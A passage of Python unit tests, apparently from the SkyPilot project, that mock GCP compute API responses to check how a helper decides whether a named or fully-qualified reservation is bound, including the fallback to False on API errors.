        mock_compute = MagicMock()
        mock_load.return_value = mock_compute
        mock_compute.reservations.return_value.list.return_value \
            .execute.return_value = {
                'items': []
            }

        result = _is_reservation_bound('my-project', 'us-central1-a',
                                       'nonexistent-reservation')
        assert result is False

    @patch('sky.provision.gcp.instance_utils'
           '.GCPComputeInstance.load_resource')
    def test_api_failure_returns_false(self, mock_load):
        """API errors should gracefully fall back to False."""
        from sky.provision.gcp.instance_utils import _is_reservation_bound
        mock_compute = MagicMock()
        mock_load.return_value = mock_compute
        mock_compute.reservations.return_value.list.return_value \
            .execute.side_effect = Exception('Permission denied')

        result = _is_reservation_bound('my-project', 'us-central1-a',
                                       'my-reservation')
        assert result is False

    @patch('sky.provision.gcp.instance_utils'
           '.GCPComputeInstance.load_resource')
    def test_full_uri_parses_short_name(self, mock_load):
        """Full reservation URI should be parsed to short name for API call."""
        from sky.provision.gcp.instance_utils import _is_reservation_bound
        mock_compute = MagicMock()
        mock_load.return_value = mock_compute
        mock_compute.reservations.return_value.list.return_value \
            .execute.return_value = {
                'items': [{
                    'name': 'my-dense-res',
                    'deploymentType': 'DENSE',
                }]
            }

        full_uri = ('projects/my-project/zones/us-central1-a'
                    '/reservations/my-dense-res')
        result = _is_reservation_bound('my-project', 'us-central1-a', full_uri)
        assert result is True

        mock_compute.reservations.return_value.list.assert_called_once_with(
            project='my-project',
            zone='us-central1-a',
            filter='name=my-dense-res',
        )
